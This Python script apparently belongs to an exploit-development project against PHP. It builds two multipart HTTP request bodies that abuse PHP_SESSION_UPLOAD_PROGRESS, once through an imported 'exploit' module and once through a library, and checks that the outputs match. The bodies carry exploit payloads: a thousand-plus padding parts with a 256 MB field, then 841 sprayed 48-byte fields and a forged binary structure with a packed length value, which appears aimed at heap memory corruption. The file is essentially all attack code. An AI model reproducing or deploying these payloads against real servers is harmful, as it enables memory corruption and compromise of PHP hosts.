#!/usr/bin/env python3
import sys, os, struct, hashlib
sys.path.insert(0, r"C:\Users\likat\p2s52704")
import exploit
from p2s8335_lib import build_multipart as lib_mp, SID, BIG_MB

def body_exploit_A():
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (256 * 1024 * 1024)},
    ]
    return exploit.build_multipart(parts, b"S" * 17)

def body_lib_A():
    parts = [{"name":f"p{i:04d}","data":b"x"} for i in range(1001)]
    parts += [{"name":"PHPSESSID","data":b"\x00"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
              {"name":"f","filename":"a.txt","data":b"A"*64},
              {"name":"big","data":b"B"*(BIG_MB*1024*1024)}]
    return lib_mp(parts, b"S"*17)

a = body_exploit_A()
b = body_lib_A()
print("exploit A:", len(a), hashlib.md5(a).hexdigest())
print("lib     A:", len(b), hashlib.md5(b).hexdigest())
print("EQUAL" if a == b else "DIFFERENT")
if a != b:
    for i in range(min(len(a), len(b))):
        if a[i] != b[i]:
            print(f"first diff at {i}: {a[i-10:i+10]!r} vs {b[i-10:i+10]!r}")
            break

# B request
def forge():
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    return bytes(forge)

def body_exploit_B():
    parts = [
        {"name": "PHPSESSID", "data": exploit.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    parts.append({"name": "1999", "data": forge()})
    return exploit.build_multipart(parts, b"B" * 10)

def body_lib_B():
    parts = [{"name":"PHPSESSID","data":SID},
             {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    for i in range(841):
        val = (f"v{i:04d}"+"x"*44)[:48]
        parts.append({"name":str(1000+i),"data":val.encode()})
    parts.append({"name":"1999","data":forge()})
    return lib_mp(parts, b"B"*10)

c = body_exploit_B()
d = body_lib_B()
print("exploit B:", len(c), hashlib.md5(c).hexdigest())
print("lib     B:", len(d), hashlib.md5(d).hexdigest())
print("EQUAL" if c == d else "DIFFERENT")
